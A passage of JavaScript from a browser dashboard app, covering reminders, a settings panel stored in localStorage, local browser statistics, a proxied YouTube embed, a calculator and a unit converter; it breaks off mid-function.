                        if (typeof r.timestamp === 'string') { r.timestamp = new Date(r.timestamp).getTime(); }
                        if (r.notified === undefined) r.notified = false;
                    });
                }
            },
            renderReminders: function() {
                const remindersList = document.getElementById('remindersList');
                remindersList.innerHTML = '';
                const sortedReminders = [...this.reminders].sort((a, b) => {
                    if (a.completed !== b.completed) return a.completed ? 1 : -1;
                    return a.timestamp - b.timestamp;
                });

                sortedReminders.forEach(r => {
                    const li = document.createElement('li');
                    li.classList.add('reminder-item');
                    if (r.completed) li.classList.add('completed');
                    li.innerHTML = `
                        <span>${r.text} - ${r.date} ${r.time}</span>
                        <div>
                            <button class="complete-btn" data-id="${r.id}">${r.completed ? 'Unmark' : 'Complete'}</button>
                            <button class="delete-btn" data-id="${r.id}">Delete</button>
                        </div>
                    `;
                    remindersList.appendChild(li);
                });

                remindersList.querySelectorAll('.delete-btn').forEach(button => {
                    button.addEventListener('click', (e) => {
                        const id = parseInt(e.target.dataset.id);
                        this.reminders = this.reminders.filter(r => r.id !== id);
                        this.saveReminders();
                        this.renderReminders();
                        this.logAlert('⏰ Reminder deleted.');
                    });
                });
                remindersList.querySelectorAll('.complete-btn').forEach(button => {
                    button.addEventListener('click', (e) => {
                        const id = parseInt(e.target.dataset.id);
                        const reminder = this.reminders.find(r => r.id === id);
                        if (reminder) {
                            reminder.completed = !reminder.completed;
                            this.saveReminders();
                            this.renderReminders();
                            this.logAlert(`⏰ Reminder "${reminder.text}" marked as ${reminder.completed ? 'completed' : 'incomplete'}.`);
                        }
                    });
                });
            },

            // --- Settings Panel Functions (Expanded with new options) ---
            initSettings: function() {
                // Initial load from localStorage / default values
                const settingsElements = {
                    themeSelector: document.getElementById('themeSelector'),
                    uiAnimationSpeed: document.getElementById('uiAnimationSpeed'),
                    uiAnimationSpeedValue: document.getElementById('uiAnimationSpeedValue'),
                    enableFancyAnimations: document.getElementById('enableFancyAnimations'),
                    consoleLoggingLevel: document.getElementById('consoleLoggingLevel'),
                    confirmLogout: document.getElementById('confirmLogout'),
                    defaultPanelOnLoad: document.getElementById('defaultPanelOnLoad'),
                    enableCalendarDisplay: document.getElementById('enableCalendarDisplay'),
                    enableUpdatesNotifications: document.getElementById('enableUpdatesNotifications'),
                    enableMotivationQuote: document.getElementById('enableMotivationQuote'),
                    globalFontSizeScale: document.getElementById('globalFontSizeScale'),
                    globalFontSizeScaleValue: document.getElementById('globalFontSizeScaleValue'),
                    mainFontFamily: document.getElementById('mainFontFamily'),
                    buttonBorderRadius: document.getElementById('buttonBorderRadius'),
                    buttonBorderRadiusValue: document.getElementById('buttonBorderRadiusValue'),
                    notificationDisplayDuration: document.getElementById('notificationDisplayDuration'),
                    notificationDisplayDurationValue: document.getElementById('notificationDisplayDurationValue'),
                    desktopNotifications: document.getElementById('desktopNotifications'),
                    reminderSound: document.getElementById('reminderSound'),
                    activityLogRetention: document.getElementById('activityLogRetention'),
                    activityLogRetentionValue: document.getElementById('activityLogRetentionValue'),
                    accentColorPicker: document.getElementById('accentColorPicker'),
                    mainBgColorPicker: document.getElementById('mainBgColorPicker'),
                    headerBgColorPicker: document.getElementById('headerBgColorPicker'),
                    buttonGlowIntensity: document.getElementById('buttonGlowIntensity'),
                    buttonGlowIntensityValue: document.getElementById('buttonGlowIntensityValue'),
                    scrollbarStyle: document.getElementById('scrollbarStyle'),
                    enableLogging: document.getElementById('enableLogging')
                };

                for (const key in settingsElements) {
                    if (!settingsElements[key] || key.endsWith("Value")) continue; // Skip if element not found or is just a display span
                    const storedValue = localStorage.getItem(key);
                    
                    if (settingsElements[key].type === 'checkbox') {
                        settingsElements[key].checked = (storedValue !== null) ? (storedValue === 'true') : settingsElements[key].checked;
                    } else if (settingsElements[key].type === 'range') {
                        settingsElements[key].value = (storedValue !== null) ? storedValue : settingsElements[key].value;
                        if (settingsElements[key+"Value"]) {
                           if(key === 'globalFontSizeScale') settingsElements[key+"Value"].textContent = `${(parseFloat(settingsElements[key].value) * 100).toFixed(0)}%`;
                           else if (key === 'buttonBorderRadius') settingsElements[key+"Value"].textContent = `${settingsElements[key].value}px`;
                           else if (key === 'buttonGlowIntensity') settingsElements[key+"Value"].textContent = `${settingsElements[key].value}`;
                           else if (key === 'activityLogRetention') settingsElements[key+"Value"].textContent = `${settingsElements[key].value} entries`;
                           else settingsElements[key+"Value"].textContent = `${settingsElements[key].value}s`; // Default for speeds
                        }
                    } else if (settingsElements[key].tagName === 'SELECT' || settingsElements[key].type === 'color') {
                        settingsElements[key].value = (storedValue !== null) ? storedValue : settingsElements[key].value;
                    }
                }
                
                // Special check for dynamic elements like motivationBox
                const motivationBox = document.getElementById('motivationBox');
                if (motivationBox) {
                    if (localStorage.getItem('enableMotivationQuote') === 'false') motivationBox.style.display = 'none';
                    else motivationBox.style.display = 'flex';
                }
                 const calendarBox = document.getElementById('calendar').closest('.box');
                if (calendarBox) {
                    if (localStorage.getItem('enableCalendarDisplay') === 'false') calendarBox.style.display = 'none';
                    else calendarBox.style.display = 'flex';
                }
                 const updatesBox = document.getElementById('updatesNotifications');
                if (updatesBox) {
                    if (localStorage.getItem('enableUpdatesNotifications') === 'false') updatesBox.style.display = 'none';
                    else updatesBox.style.display = 'flex';
                }

                // Apply dynamic styles to actual DOM after loading all settings
                this.applySettingsToDOM();

                // --- Event Listeners for new Settings ---
                settingsElements.themeSelector?.addEventListener('change', (e) => {
                    const theme = e.target.value;
                    if (theme === 'light') document.body.classList.add('light-theme');
                    else document.body.classList.remove('light-theme');
                    localStorage.setItem('theme', theme);
                    this.applyCustomStyles();
                    this.logAlert(`Theme set to ${theme}.`);
                    this.stats.themeToggles++; localStorage.setItem('stats_theme_toggles', this.stats.themeToggles.toString()); this.updateStatsDisplay();
                });
                settingsElements.uiAnimationSpeed?.addEventListener('input', (e) => {
                    const speed = e.target.value;
                    root.style.setProperty('--ui-animation-speed', speed + 's');
                    settingsElements.uiAnimationSpeedValue.textContent = speed + 's';
                    localStorage.setItem('uiAnimationSpeed', speed);
                });
                settingsElements.enableFancyAnimations?.addEventListener('change', (e) => {
                    const enabled = e.target.checked;
                    localStorage.setItem('enableFancyAnimations', enabled);
                    root.style.setProperty('--ui-animation-speed', enabled ? (localStorage.getItem('uiAnimationSpeed') || '0.3') + 's' : '0s');
                    this.logAlert(`Fancy Animations ${enabled ? 'Enabled' : 'Disabled'}.`);
                });
                settingsElements.consoleLoggingLevel?.addEventListener('change', (e) => {
                  const level = e.target.value;
                  localStorage.setItem('consoleLoggingLevel', level);
                  this.logAlert(`Console logging level set to ${level.toUpperCase()}.`);
                });
                settingsElements.confirmLogout?.addEventListener('change', (e) => {
                  localStorage.setItem('confirmLogout', e.target.checked);
                  this.logAlert(`Confirm Logout setting ${e.target.checked ? 'enabled' : 'disabled'}.`);
                });
                settingsElements.defaultPanelOnLoad?.addEventListener('change', (e) => {
                  localStorage.setItem('defaultPanelOnLoad', e.target.value);
                  this.logAlert(`Default panel on login set to "${e.target.options[e.target.selectedIndex].text}".`);
                });
                 settingsElements.enableCalendarDisplay?.addEventListener('change', (e) => {
                  const visible = e.target.checked;
                  const calendarBox = document.getElementById('calendar').closest('.box');
                  if (calendarBox) calendarBox.style.display = visible ? 'flex' : 'none';
                  localStorage.setItem('enableCalendarDisplay', visible);
                  this.logAlert(`Calendar display ${visible ? 'shown' : 'hidden'}.`);
                });
                settingsElements.enableUpdatesNotifications?.addEventListener('change', (e) => {
                  const visible = e.target.checked;
                  const updatesBox = document.getElementById('updatesNotifications');
                  if (updatesBox) updatesBox.style.display = visible ? 'flex' : 'none';
                  localStorage.setItem('enableUpdatesNotifications', visible);
                  this.logAlert(`Updates & Notifications display ${visible ? 'shown' : 'hidden'}.`);
                });
                settingsElements.enableMotivationQuote?.addEventListener('change', (e) => {
                    const visible = e.target.checked;
                    const motivationBox = document.getElementById('motivationBox');
                    if (motivationBox) motivationBox.style.display = visible ? 'flex' : 'none';
                    localStorage.setItem('enableMotivationQuote', visible);
                    this.logAlert(`Motivational Quote display ${visible ? 'shown' : 'hidden'}.`);
                });
                settingsElements.globalFontSizeScale?.addEventListener('input', (e) => {
                    const scale = e.target.value;
                    root.style.setProperty('--base-font-size', `${parseFloat(scale) * 16}px`);
                    settingsElements.globalFontSizeScaleValue.textContent = `${(parseFloat(scale) * 100).toFixed(0)}%`;
                    localStorage.setItem('globalFontSizeScale', scale);
                });
                settingsElements.mainFontFamily?.addEventListener('change', (e) => {
                    const font = e.target.value;
                    root.style.setProperty('--font-family', font);
                    localStorage.setItem('mainFontFamily', font);
                    this.logAlert(`Main font family changed to ${font}.`);
                });
                 settingsElements.buttonBorderRadius?.addEventListener('input', (e) => {
                    const radius = e.target.value;
                    root.style.setProperty('--button-border-radius', radius + 'px');
                    settingsElements.buttonBorderRadiusValue.textContent = `${radius}px`;
                    localStorage.setItem('buttonBorderRadius', radius);
                    this.applyCustomStyles(); // Recalculate shadows too
                });
                settingsElements.notificationDisplayDuration?.addEventListener('input', (e) => {
                    const duration = e.target.value;
                    settingsElements.notificationDisplayDurationValue.textContent = duration + 's';
                    localStorage.setItem('notificationDisplayDuration', duration);
                });
                settingsElements.desktopNotifications?.addEventListener('change', (e) => {
                    const enabled = e.target.checked;
                    localStorage.setItem('desktopNotifications', enabled);
                    if (enabled && Notification.permission !== "granted") Notification.requestPermission();
                    this.logAlert(`Desktop notifications ${enabled ? 'enabled' : 'disabled'}.`);
                });
                settingsElements.reminderSound?.addEventListener('change', (e) => {
                    localStorage.setItem('reminderSound', e.target.checked);
                    this.logAlert(`Reminder sound ${e.target.checked ? 'on' : 'off'}.`);
                });
                 settingsElements.activityLogRetention?.addEventListener('input', (e) => {
                    const entries = e.target.value;
                    settingsElements.activityLogRetentionValue.textContent = `${entries} entries`;
                    localStorage.setItem('activityLogRetention', entries);
                    this.logAlert(`Activity Log retention set to ${entries} entries.`);
                });
                settingsElements.accentColorPicker?.addEventListener('input', (e) => {
                    localStorage.setItem('accentColor', e.target.value);
                    this.applyCustomStyles();
                    this.logAlert(`Accent color changed to ${e.target.value}.`);
                });
                settingsElements.mainBgColorPicker?.addEventListener('input', (e) => {
                    const color = e.target.value;
                    localStorage.setItem('mainBgColorStart', color); // Save custom property for gradient start
                    document.documentElement.style.setProperty('--main-bg-start', color); // Directly apply
                    this.applyCustomStyles();
                    this.logAlert(`Main background start color changed to ${color}.`);
                });
                settingsElements.headerBgColorPicker?.addEventListener('input', (e) => {
                    const color = e.target.value;
                    localStorage.setItem('headerBgColor', color);
                    this.applyCustomStyles(); // To update gradient in header
                    this.logAlert(`Header background color changed to ${color}.`);
                });
                 settingsElements.buttonGlowIntensity?.addEventListener('input', (e) => {
                    const intensity = e.target.value;
                    root.style.setProperty('--button-glow-intensity', intensity);
                    settingsElements.buttonGlowIntensityValue.textContent = `${intensity}`;
                    localStorage.setItem('buttonGlowIntensity', intensity);
                    this.applyCustomStyles(); // To update existing shadows
                });
                settingsElements.scrollbarStyle?.addEventListener('change', (e) => {
                  const custom = e.target.checked;
                  localStorage.setItem('scrollbarStyle', custom);
                  if (custom) document.body.classList.add('custom-scrollbar');
                  else document.body.classList.remove('custom-scrollbar');
                  this.logAlert(`Custom scrollbar style ${custom ? 'enabled' : 'disabled'}.`);
                });
                settingsElements.enableLogging?.addEventListener('change', (e) => {
                    localStorage.setItem('enableLogging', e.target.checked);
                    this.logAlert(`Analytics logging (webhooks) ${e.target.checked ? 'Enabled' : 'Disabled'}.`);
                });


                document.getElementById('clearCacheBtn')?.addEventListener('click', () => {
                    if (confirm('Are you sure you want to clear ALL local data (settings, notes, reminders, logs)? This cannot be undone.')) {
                        localStorage.clear();
                        dashboard.activityLogHistory = []; // Clear in-memory history too
                        this.logAlert('LocalStorage cleared. Page reloading...');
                        location.reload();
                    }
                });
                document.getElementById('dataExportBtn')?.addEventListener('click', () => {
                    const data = {
                        localStorage: {},
                        activityLog: dashboard.activityLogHistory
                    };
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        data.localStorage[key] = localStorage.getItem(key);
                    }
                    const jsonString = JSON.stringify(data, null, 2);
                    const blob = new Blob([jsonString], { type: 'application/json' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `private_system_data_${new Date().toISOString().slice(0, 19).replace('T', '_').replace(/:/g, '-')}.json`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    this.logAlert('📤 All user data (including activity log) exported.');
                });
                document.querySelectorAll('.settings-grid').forEach(grid => {
                    grid.addEventListener('click', (e) => {
                        if (e.target.classList.contains('action-button') && e.target.textContent === 'Reset') {
                            const pickerInput = e.target.closest('.color-picker')?.querySelector('input[type="color"]');
                            if (pickerInput) this.resetColorSetting(pickerInput.id);
                        }
                    });
                });
            },
            applySettingsToDOM: function() {
                const root = document.documentElement;

                // Theme
                const savedTheme = localStorage.getItem('theme');
                if (savedTheme === 'light') document.body.classList.add('light-theme');
                else document.body.classList.remove('light-theme');

                // Animation Speed
                const uiAnimationSpeed = localStorage.getItem('uiAnimationSpeed') || '0.3';
                root.style.setProperty('--ui-animation-speed', uiAnimationSpeed + 's');
                if(document.getElementById('uiAnimationSpeedValue')) document.getElementById('uiAnimationSpeedValue').textContent = uiAnimationSpeed + 's';
                if(localStorage.getItem('enableFancyAnimations') === 'false') { // Override if animations disabled
                  root.style.setProperty('--ui-animation-speed', '0s');
                }

                // Announcement Scroll Speed
                const scrollSpeed = localStorage.getItem('announcementScrollSpeed') || '20';
                const announcementBar = document.getElementById('announcementBar');
                if(announcementBar) announcementBar.style.animationDuration = scrollSpeed + 's';
                if(document.getElementById('announcementScrollSpeedValue')) document.getElementById('announcementScrollSpeedValue').textContent = scrollSpeed + 's';

                // Font Family
                const mainFontFamily = localStorage.getItem('mainFontFamily') || "'Segoe UI', sans-serif";
                root.style.setProperty('--font-family', mainFontFamily);
                if(document.getElementById('mainFontFamily')) document.getElementById('mainFontFamily').value = mainFontFamily;

                // Font Size Scale
                const globalFontSizeScale = localStorage.getItem('globalFontSizeScale') || '1.0';
                root.style.setProperty('--base-font-size', `${parseFloat(globalFontSizeScale) * 16}px`);
                if(document.getElementById('globalFontSizeScaleValue')) document.getElementById('globalFontSizeScaleValue').textContent = `${(parseFloat(globalFontSizeScale) * 100).toFixed(0)}%`;
                
                // Button Border Radius
                const buttonBorderRadius = localStorage.getItem('buttonBorderRadius') || '8';
                root.style.setProperty('--button-border-radius', buttonBorderRadius + 'px');
                if(document.getElementById('buttonBorderRadiusValue')) document.getElementById('buttonBorderRadiusValue').textContent = `${buttonBorderRadius}px`;

                // Button Glow Intensity
                const buttonGlowIntensity = localStorage.getItem('buttonGlowIntensity') || '0.2';
                root.style.setProperty('--button-glow-intensity', buttonGlowIntensity);
                if(document.getElementById('buttonGlowIntensityValue')) document.getElementById('buttonGlowIntensityValue').textContent = `${buttonGlowIntensity}`;

                // Element visibility from settings
                const motivationBox = document.getElementById('motivationBox');
                if (motivationBox) {
                    if (localStorage.getItem('enableMotivationQuote') === 'false') motivationBox.style.display = 'none';
                    else motivationBox.style.display = 'flex';
                }
                const calendarBox = document.getElementById('calendar')?.closest('.box');
                if (calendarBox) {
                    if (localStorage.getItem('enableCalendarDisplay') === 'false') calendarBox.style.display = 'none';
                    else calendarBox.style.display = 'flex';
                }
                 const updatesBox = document.getElementById('updatesNotifications');
                if (updatesBox) {
                    if (localStorage.getItem('enableUpdatesNotifications') === 'false') updatesBox.style.display = 'none';
                    else updatesBox.style.display = 'flex';
                }
                
                // Custom scrollbar
                const scrollbarStyleToggle = document.getElementById('scrollbarStyle');
                if (scrollbarStyleToggle) {
                    if (localStorage.getItem('scrollbarStyle') === 'true') document.body.classList.add('custom-scrollbar');
                    else document.body.classList.remove('custom-scrollbar');
                    scrollbarStyleToggle.checked = localStorage.getItem('scrollbarStyle') === 'true';
                }
                

                // Set color picker initial values based on localStorage
                const accentColorPicker = document.getElementById('accentColorPicker');
                if (accentColorPicker) accentColorPicker.value = localStorage.getItem('accentColor') || '#ff914d';
                const mainBgColorPicker = document.getElementById('mainBgColorPicker');
                if (mainBgColorPicker) mainBgColorPicker.value = localStorage.getItem('mainBgColorStart') || (document.body.classList.contains('light-theme') ? '#f0f0f0' : '#0d0d0d'); // Start color
                const headerBgColorPicker = document.getElementById('headerBgColorPicker');
                if (headerBgColorPicker) headerBgColorPicker.value = localStorage.getItem('headerBgColor') || (document.body.classList.contains('light-theme') ? this.lightenColor(accentColorPicker.value, 10) : (accentColorPicker.value));
                
                // Finally, apply all gathered custom styles (colors, border-radius etc.)
                this.applyCustomStyles();
            },
            resetColorSetting: function(pickerId) {
                switch (pickerId) {
                    case 'accentColorPicker':
                        localStorage.removeItem('accentColor');
                        document.getElementById('accentColorPicker').value = '#ff914d';
                        this.logAlert('Custom accent color reset.');
                        break;
                    case 'mainBgColorPicker':
                        localStorage.removeItem('mainBgColorStart'); // Remove custom property for gradient start
                        document.getElementById('mainBgColorPicker').value = '#0d0d0d'; // Default dark theme start
                        document.documentElement.style.setProperty('--main-bg-start', document.body.classList.contains('light-theme') ? '#f0f0f0' : '#0d0d0d');
                        this.logAlert('Custom main background start color reset.');
                        break;
                    case 'headerBgColorPicker':
                        localStorage.removeItem('headerBgColor');
                        document.getElementById('headerBgColorPicker').value = '#ff914d'; // Default accent color
                        this.logAlert('Custom header background color reset.');
                        break;
                }
                this.applyCustomStyles(); // Reapply all custom styles to ensure consistency
            },

            // --- Super Advanced Statistics (logic and adapted for expanded fields) ---
            initSuperAdvancedStatsDisplay: function() {
                const getBrowserName = () => {
                    const ua = navigator.userAgent;
                    if(ua.includes("Firefox")) return "Firefox";
                    if(ua.includes("SamsungBrowser")) return "Samsung Browser";
                    if(ua.includes("Opera") || ua.includes("OPR")) return "Opera";
                    if(ua.includes("Trident")) return "Internet Explorer";
                    if(ua.includes("Edge")) return "Edge";
                    if(ua.includes("Chrome") && !ua.includes("Edge")) return "Chrome";
                    if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
                    return "Unknown";
                }
                const getOS = () => {
                    const ua = navigator.userAgent;
                    if(ua.includes("Windows")) return "Windows";
                    if(ua.includes("Macintosh")) return "macOS";
                    if(ua.includes("Linux")) return "Linux";
                    if(ua.includes("Android")) return "Android";
                    if(ua.includes("like Mac")) return "iOS";
                    return "Unknown";
                }

                this.stats.browserName = getBrowserName();
                this.stats.osName = getOS();
                this.stats.screenRes = `${screen.width}x${screen.height} (${screen.availWidth}x${screen.availHeight} avail)`;
                this.stats.viewportSize = `${window.innerWidth}x${window.innerHeight}`;
                this.stats.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
                this.stats.cpus = navigator.hardwareConcurrency || 'N/A';
                
                const updateOnlineStatus = () => {
                    this.stats.onlineStatus = navigator.onLine ? 'Online' : 'Offline';
                    this.updateStatsDisplay();
                }
                window.addEventListener('online', updateOnlineStatus);
                window.addEventListener('offline', updateOnlineStatus);
                updateOnlineStatus();

                this.stats.userAgent = navigator.userAgent || 'N/A';
                this.stats.browserLang = navigator.language || 'N/A';
                this.stats.devicePixelRatio = window.devicePixelRatio ? window.devicePixelRatio.toFixed(2) : 'N/A';
                
                const pointerType = window.matchMedia("(pointer: fine)").matches ? "Fine" : 
                                    (window.matchMedia("(pointer: coarse)").matches ? "Coarse" : "N/A");
                this.stats.pointerType = pointerType;
                
                this.stats.referrer = document.referrer || 'None';
                this.stats.historyLength = window.history.length.toString();
                this.stats.notificationPerm = Notification.permission || 'N/A';

                this.updateStatsDisplay(); 
            },
            updateStatsDisplay: function() {
                document.getElementById('statsUptime') && (document.getElementById('statsUptime').innerText = this.stats.sessionUptime);
                document.getElementById('statsClicks') && (document.getElementById('statsClicks').innerText = this.stats.clicks.toString());
                document.getElementById('statsPanelsOpened') && (document.getElementById('statsPanelsOpened').innerText = this.stats.panelsOpened.toString());
                document.getElementById('statsThemeToggles') && (document.getElementById('statsThemeToggles').innerText = this.stats.themeToggles.toString());
                document.getElementById('statsRemindersSet') && (document.getElementById('statsRemindersSet').innerText = this.stats.remindersSet.toString());
                document.getElementById('statsCanvasUsed') && (document.getElementById('statsCanvasUsed').innerText = this.stats.canvasSaves.toString());
                document.getElementById('statsScreenshots') && (document.getElementById('statsScreenshots').innerText = this.stats.screenshotsTaken.toString());
                document.getElementById('statsMediaLoaded') && (document.getElementById('statsMediaLoaded').innerText = this.stats.mediaLoaded.toString());
                document.getElementById('statsTimeToLogin') && (document.getElementById('statsTimeToLogin').innerText = this.stats.timeToLogin.toString());
                document.getElementById('statsLocalStorageItems') && (document.getElementById('statsLocalStorageItems').innerText = localStorage.length.toString());
                document.getElementById('statsSessionStorageItems') && (document.getElementById('statsSessionStorageItems').innerText = sessionStorage.length.toString());

                // Populate dynamic stat fields from this.stats object directly
                document.getElementById('statsBrowser') && (document.getElementById('statsBrowser').innerText = this.stats.browserName);
                document.getElementById('statsOS') && (document.getElementById('statsOS').innerText = this.stats.osName);
                document.getElementById('statsScreenRes') && (document.getElementById('statsScreenRes').innerText = this.stats.screenRes);
                document.getElementById('statsViewportSize') && (document.getElementById('statsViewportSize').innerText = this.stats.viewportSize);
                document.getElementById('statsMemory') && (document.getElementById('statsMemory').innerText = this.stats.deviceMemory);
                document.getElementById('statsCpus') && (document.getElementById('statsCpus').innerText = this.stats.cpus);
                document.getElementById('statsOnline') && (document.getElementById('statsOnline').innerText = this.stats.onlineStatus);
                document.getElementById('statsUserAgent') && (document.getElementById('statsUserAgent').innerText = this.stats.userAgent);
                document.getElementById('statsLang') && (document.getElementById('statsLang').innerText = this.stats.browserLang);
                document.getElementById('statsPixelRatio') && (document.getElementById('statsPixelRatio').innerText = this.stats.devicePixelRatio);
                document.getElementById('statsPointerType') && (document.getElementById('statsPointerType').innerText = this.stats.pointerType);
                document.getElementById('statsReferrer') && (document.getElementById('statsReferrer').innerText = this.stats.referrer);
                document.getElementById('statsHistoryLength') && (document.getElementById('statsHistoryLength').innerText = this.stats.historyLength);
                document.getElementById('statsNotificationPerm') && (document.getElementById('statsNotificationPerm').innerText = this.stats.notificationPerm);

                const zoomElement = document.getElementById('statsZoom');
                if (zoomElement) {
                    zoomElement.innerText = `${Math.round(parseFloat(document.body.style.zoom || 1) * 100)}%`;
                    this.stats.zoomLevel = zoomElement.innerText; // Keep stat updated
                }
            },

            // --- Proxied Media Player (retained) ---
            initMediaPlayer: function() {
              document.getElementById('loadYoutubeBtn').addEventListener('click', () => {
                  const input = document.getElementById('youtubeIdInput').value.trim();
                  let videoId;

                  const urlRegex = /(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
                  const match = input.match(urlRegex);
                  if (match && match[1]) {
                      videoId = match[1];
                  } else if (input.length === 11 && /^[a-zA-Z0-9_-]+$/.test(input)) {
                      videoId = input;
                  } else {
                       this.logAlert('❗️ Invalid YouTube URL or Video ID. Please provide a valid ID or full URL.');
                       document.getElementById('youtubePlayer').innerHTML = "Video player will load here...";
                       return;
                  }

                  if(videoId) {
                      const proxyUrl = `https://invidious.io.lol/embed/${videoId}`; // Consider multiple proxy options in settings
                      document.getElementById('youtubePlayer').innerHTML = `<iframe width="100%" height="100%" src="${proxyUrl}" frameborder="0" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>`;
                      this.logAlert(`📺 Proxied YouTube video loaded: ${videoId}`);
                      this.stats.mediaLoaded++;
                      localStorage.setItem('stats_media_loaded', this.stats.mediaLoaded.toString());
                      this.updateStatsDisplay();
                  }
              });
            },
            
            // NEWLY ADDED: Calculator functionality (re-introduced)
            calculator: {
                output: null, // Initialized later in init, based on existing element
                currentOperand: '0',
                previousOperand: '',
                operation: null,
                shouldResetScreen: false,

                init: function() {
                    this.output = document.getElementById('calculatorOutput');
                    if (!this.output) {
                      dashboard.logAlert('Calculator output element not found, calculator might be inactive.');
                      return;
                    }
                    const buttons = document.querySelectorAll('#calculatorPanel .calculator-grid button');
                    buttons.forEach(button => {
                        button.addEventListener('click', (e) => this.handleClick(e.target.dataset.value));
                    });
                    document.addEventListener('keydown', (e) => { // Key presses should still be global but apply to active panel.
                        if (dashboard.activePanel && dashboard.activePanel.id === 'calculatorPanel') {
                           this.handleKeyboard(e.key);
                           e.preventDefault(); // Prevent page scrolling etc.
                        }
                    });
                    this.updateDisplay();
                },

                handleClick: function(value) {
                    // Filter sensitive values like 'password' if you need specific logging
                    dashboard.logAlert(`🧮 Calculator action: ${value}`); // Log calculator actions
                    if (value === 'clear') this.clear();
                    else if (value === '+/-') this.toggleSign();
                    else if (value === '%') this.percentage();
                    else if (value === '=' ) this.operate(); // Exclude Enter from '=' check here, it's in keyboard
                    else if (['+', '-', '*', '/'].includes(value)) this.chooseOperation(value);
                    else if (value === '.') this.appendNumber(value);
                    else if (!isNaN(value) && value !== ' ') this.appendNumber(value); // Numbers only
                    this.updateDisplay();
                },
                 handleKeyboard: function(key) {
                    if (key >= '0' && key <= '9' || key === '.') {
                        this.appendNumber(key);
                    } else if (key === '+' || key === '-' || key === '*' || key === '/') {
                        this.chooseOperation(key);
                    } else if (key === '=' || key === 'Enter') {
                        this.operate();
                    } else if (key === 'Escape' || key === 'Delete' || key === 'Backspace') {
                        this.clear(); // Clear on Esc/Delete/Backspace
                    }
                    this.updateDisplay();
                },

                clear: function() {
                    this.currentOperand = '0';
                    this.previousOperand = '';
                    this.operation = null;
                    this.shouldResetScreen = false;
                },

                appendNumber: function(number) {
                    if (this.currentOperand === '0' && number !== '.') { // Replace leading zero with number
                        this.currentOperand = number;
                    } else if (this.shouldResetScreen) { // Start new number after operation or equals
                        this.currentOperand = number;
                        this.shouldResetScreen = false;
                    } else if (number === '.' && this.currentOperand.includes('.')) {
                        return; // Prevent multiple decimals
                    } else {
                        this.currentOperand += number;
                    }
                },

                toggleSign: function() {
                    this.currentOperand = (parseFloat(this.currentOperand) * -1).toString();
                },

                percentage: function() {
                    this.currentOperand = (parseFloat(this.currentOperand) / 100).toString();
                },

                chooseOperation: function(operator) {
                    if (this.currentOperand === '') return;
                    if (this.previousOperand !== '') {
                        this.operate();
                    }
                    this.operation = operator;
                    this.previousOperand = this.currentOperand;
                    this.shouldResetScreen = true; // Prepare for new input after operation
                },

                operate: function() {
                    let computation;
                    const prev = parseFloat(this.previousOperand);
                    const current = parseFloat(this.currentOperand);
                    if (isNaN(prev) || isNaN(current)) {
                        this.clear(); // Clear if operands are invalid (e.g. initial '=' or invalid syntax)
                        return;
                    }

                    switch (this.operation) {
                        case '+': computation = prev + current; break;
                        case '-': computation = prev - current; break;
                        case '*': computation = prev * current; break;
                        case '/': 
                            if (current === 0) {
                                dashboard.logAlert('❗️ Calculator error: Division by zero.');
                                computation = 'Error';
                            } else {
                                computation = prev / current;
                            }
                            break;
                        default: return; // No operation set
                    }
                    // Handle "Error" specifically
                    this.currentOperand = (computation === 'Error') ? 'Error' : computation.toString();
                    this.operation = null;
                    this.previousOperand = '';
                    this.shouldResetScreen = true; // For potential chain operations or new input
                },

                updateDisplay: function() {
                    this.output.textContent = this.currentOperand;
                }
            },
            initCalculator: function() {
                this.calculator.init();
            },
            
            // NEWLY ADDED: Unit Converter (re-introduced)
            unitConverter: {
                units: { // Definitions based on meter/kg/celsius/liter as base
                    length: {
                        'meter': 1, 'kilometer': 1000, 'centimeter': 0.01, 'millimeter': 0.001,
                        'mile': 1609.34, 'yard': 0.9144, 'foot': 0.3048, 'inch': 0.0254
                    },
                    weight: {
                        'kilogram': 1, 'gram': 0.001, 'milligram': 0.000001, 'metric ton': 1000,
                        'pound': 0.453592, 'ounce': 0.0283495
                    },
                    temperature: { // Base conversion to/from Celsius
                        'celsius': (val, toBase = true) => toBase ? val : val,
                        'fahrenheit': (val, toBase = true) => toBase ? (val - 32) * 5 / 9 : (val * 9 / 5) + 32,
                        'kelvin': (val, toBase = true) => toBase ? val - 273.15 : val + 273.15
                    },
                    volume: {
                        'liter': 1, 'milliliter': 0.001, 'cubic meter': 1000, 'gallon': 3.78541,
                        'quart': 0.946353, 'pint': 0.473176, 'fluid ounce': 0.0295735
                    }
                },
                conversionType: null, convertValue: null, convertFromUnit: null, convertToUnit: null,
                conversionResult: null, performConversionBtn: null,

                init: function() {
                    this.conversionType = document.getElementById('conversionType');
                    this.convertValue = document.getElementById('convertValue');
                    this.convertFromUnit = document.getElementById('convertFromUnit');
                    this.convertToUnit = document.getElementById('convertToUnit');
                    this.conversionResult = document.getElementById('conversionResult');
                    this.performConversionBtn = document.getElementById('performConversionBtn');

                    if (!this.conversionType) { // Check if elements exist. If panel removed, they won't.
                        dashboard.logAlert('Unit Converter elements not found, converter might be inactive.');
                        return;
                    }

                    this.conversionType.addEventListener('change', () => this.populateUnits());
                    this.convertValue.addEventListener('input', () => this.performConversion());
                    this.convertFromUnit.addEventListener('change', () => this.performConversion());
                    this.convertToUnit.addEventListener('change', () => this.performConversion());
                    this.performConversionBtn.addEventListener('click', () => {
                      this.performConversion();
                      dashboard.logAlert(`🔄 Performed Unit Conversion.`);
                    });
                    
                    this.populateUnits(); // Initial population
                },

                populateUnits: function() {
                    const type = this.conversionType.value;
                    const unitsForType = this.units[type];
                    this.convertFromUnit.innerHTML = '';
                    this.convertToUnit.innerHTML = '';

                    for (const unit in unitsForType) {
                        const optionFrom = document.createElement('option');
                        optionFrom.value = unit;
                        optionFrom.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
                        this.convertFromUnit.appendChild(optionFrom);

                        const optionTo = document.createElement('option');
                        optionTo.value = unit;
                        optionTo.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
